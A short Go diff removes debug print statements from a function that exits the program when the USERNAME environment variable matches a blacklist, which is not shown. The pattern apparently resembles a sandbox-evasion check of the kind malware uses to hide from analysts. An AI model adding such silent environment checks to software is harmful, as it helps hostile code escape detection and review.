@@ -1,7 +1,6 @@
 package usernamecheck
 
 import (
-	"fmt"
 	"os"
 	"strings"
 )
@@ -11,10 +10,8 @@ func CheckForBlacklistedNames() bool {
 	user := strings.ToLower(os.Getenv("USERNAME"))
 	for _, bn := range bn {
 		if user == strings.ToLower(bn) {
-			fmt.Println("Debug Check: Bad name found")
 			os.Exit(-1)
 		}
 	}
-	fmt.Println("Debug Check: Passed Username Check")
 	return false
 }
